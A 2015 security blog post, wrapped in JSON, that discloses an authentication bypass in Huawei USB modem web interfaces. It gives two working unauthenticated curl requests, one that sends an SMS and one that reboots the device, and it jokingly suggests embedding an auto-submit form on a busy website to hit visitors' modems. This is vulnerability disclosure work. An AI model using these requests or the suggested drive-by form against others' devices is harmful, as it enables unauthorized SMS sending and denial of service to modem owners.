{
  "Source": "www.evilsocket.net",
  "Title": "Huawei Modems Authentication Bypass",
  "Link": "https://www.evilsocket.net/2015/02/01/Huawei-Modems-Authentication-Bypass/",
  "Content": "\u003cdiv class=\"content\" itemprop=\"articleBody\"\u003e\n\u003cp\u003e\u003cimg src=\"/images/2015/02/Huawei-Logo1422524173.jpg\" alt=\"huawei logo\"/\u003e\u003c/p\u003e\n\u003cp\u003eI own a couple of Huawei USB modems, a \u003cstrong\u003eHuawei E587\u003c/strong\u003e and a \u003cstrong\u003eHuawei E355\u003c/strong\u003e, while the first one is great for high speed mobile connections due to its dual channel feature, the E355 is a good choice for a small, easy to use and connect ( \u003cstrong\u003ecdc_ether\u003c/strong\u003e baby! ) mobile device.\u003c/p\u003e\n\u003cp\u003eBut are they safe? … \u003cstrong\u003eof course NOT\u003c/strong\u003e :D\u003c/p\u003e\n\u003cspan id=\"more\"\u003e\u003c/span\u003e\n\u003cp\u003eMany other researchers reported a \u003ca target=\"_blank\" rel=\"noopener\" href=\"http://www.huawei.com/en/security/psirt/security-bulletins/security-advisories/hw-275474.htm\"\u003efew vulnerabilities\u003c/a\u003e on some \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://www.exploit-db.com/exploits/19185/\"\u003especific devices\u003c/a\u003e, but actually the same vulnerability, the authentication bypass, applies for every device having the Huawei \u003cstrong\u003eWebUI\u003c/strong\u003e if you use their API url instead of the specific html form of the device model itself.\u003c/p\u003e\n\u003cp\u003eMost of the html forms inside the web ui, which are “protected” by a username and passsword ( default admin:admin, change it! ), just perform an AJAX request to the \u003cstrong\u003ereal\u003c/strong\u003e API url, for instance:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e/js/sms.js\u003c/strong\u003e from E355 WebUI v11.011.04.00.625\u003c/p\u003e\n\u003cfigure class=\"highlight javascript\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e....\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e....\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003esaveAjaxData(\u003cspan class=\"string\"\u003e\u0026#34;api/sms/send-sms\u0026#34;\u003c/span\u003e, submitData, \u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"params\"\u003e$xml\u003c/span\u003e) \u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"comment\"\u003e//-------------------------------------------------------------------\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"title\"\u003egetSendSmsStatus\u003c/span\u003e(\u003cspan class=\"params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        getAjaxData(\u003cspan class=\"string\"\u003e\u0026#34;api/sms/send-status\u0026#34;\u003c/span\u003e, \u003cspan class=\"function\"\u003e\u003cspan class=\"keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"params\"\u003e$xml\u003c/span\u003e) \u003c/span\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            \u003cspan class=\"keyword\"\u003evar\u003c/span\u003e ret = xml2object($xml);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            ret = ret.response;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            \u003cspan class=\"keyword\"\u003evar\u003c/span\u003e sendTotalCount = ret.TotalCount;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            \u003cspan class=\"keyword\"\u003evar\u003c/span\u003e currentSendIndex = ret.CurIndex;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            \u003cspan class=\"keyword\"\u003evar\u003c/span\u003e currentSendPhone = ret.Phone;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            \u003cspan class=\"keyword\"\u003evar\u003c/span\u003e sendSuccessPhones = ret.SucPhone;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            \u003cspan class=\"keyword\"\u003evar\u003c/span\u003e sendFailPhones = ret.FailPhone;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            \u003cspan class=\"keyword\"\u003evar\u003c/span\u003e statusContent = sms_hint_sending + \u003cspan class=\"string\"\u003e\u0026#34;\u0026amp;nbsp;\u0026#34;\u003c/span\u003e + currentSendIndex + \u003cspan class=\"string\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e + sendTotalCount;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e....\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e....\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eAs you might have already guessed, those urls which are all starting with \u003cstrong\u003e/api/\u003c/strong\u003e are not password protected whatsoever, for instance if you try the following (while you’re using your Huawei device and you have a SIM card in it):\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ecurl \u0026#34;http://192.168.1.1/api/sms/send-sms\u0026#34; --data \u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;request\u0026gt;\u0026lt;Index\u0026gt;-1\u0026lt;/Index\u0026gt;\u0026lt;Phones\u0026gt;\u0026lt;Phone\u0026gt;XXXXXXXXXX\u0026lt;/Phone\u0026gt;\u0026lt;/Phones\u0026gt;\u0026lt;Sca\u0026gt;\u0026lt;/Sca\u0026gt;\u0026lt;Content\u0026gt;test\u0026lt;/Content\u0026gt;\u0026lt;Length\u0026gt;4\u0026lt;/Length\u0026gt;\u0026lt;Reserved\u0026gt;1\u0026lt;/Reserved\u0026gt;\u0026lt;Date\u0026gt;2015-02-01 14:02:26\u0026lt;/Date\u0026gt;\u0026lt;/request\u0026gt;\u0026#39;\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ewhere XXXXXXXXXX would be your phone number, you’ll get a “test” sms from that device.\u003c/p\u003e\n\u003cp\u003eOr for instance, you could just reboot the device itself without being authenticated to it:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ecurl \u0026#34;http://192.168.1.1/api/device/control\u0026#34; --data \u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;request\u0026gt;\u0026lt;Control\u0026gt;1\u0026lt;/Control\u0026gt;\u0026lt;/request\u0026gt;\u0026#39;\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eImagine to put an auto-submit javascript-generated form inside an high traffic website :D\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2015/02/bc39fd77b95c22fff332e8bf38ff78b52c88da48826447d3e7d37579740f2cf7.jpg\" alt=\"evil laugh\"/\u003e\u003c/p\u003e\n\u003cp\u003eThe firmware and webui are now for you to explore, you can find quite nice stuff in there if you know where to look at ;)\u003c/p\u003e\n\u003c/div\u003e",
  "Date": "2015-02-01T13:16:03Z",
  "Author": "Simone Margaritelli"
}